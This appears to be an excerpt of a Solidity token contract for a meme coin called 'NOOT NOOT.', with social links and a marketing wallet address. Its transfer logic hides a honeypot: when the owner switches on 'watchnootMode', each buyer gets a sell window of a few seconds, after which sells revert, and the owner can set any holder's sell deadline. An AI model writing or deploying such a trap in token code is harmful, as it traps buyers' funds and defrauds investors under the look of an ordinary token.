...
// Twitter : https://twitter.com/nootcoineth 🐧
// Telegram : https://t.me/nootportaleth ❄️
// Website : https://www.nootcoineth.xyz/ 🧊
...
contract NOOT is Context, IERC20, Ownable {
    ...
    mapping (address => uint256) public _nootSellTime;

    uint256 private _nootSellTimeOffset = 3;
    bool public watchnootMode = false;
    uint256 public _caughtNoots;
    ...
    uint256 public maxTxAmount = 40_000 * (10**_decimals);
    uint256 public maxWallet =  40_000 * (10**_decimals);

    string private constant _name = "NOOT NOOT."; 
    ...
    address public marketingWallet = 0x29AC5D4Ba341A7b8a2b77904b64ca5483355f773;
...
//============== Owner Functions ===========//
    ...
    function owner_setWatchNootMode(bool status_) external onlyOwner{
        watchnootMode = status_;
    }

    function owner_setNootSellTimeForAddress(address holder, uint dTime) external onlyOwner{
        _nootSellTime[holder] = block.timestamp + dTime;
    }
    ...
    function _transfer(address from,address to,uint256 amount) private {
        ...
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            ...
            if (from == pair){
                if(watchnootMode){
                    _caughtNoots++;
                    _nootSellTime[to] = block.timestamp + _nootSellTimeOffset;
                }
            }else{
                if (_nootSellTime[from] != 0)
                    require(block.timestamp < _nootSellTime[from]); 
            }
        }
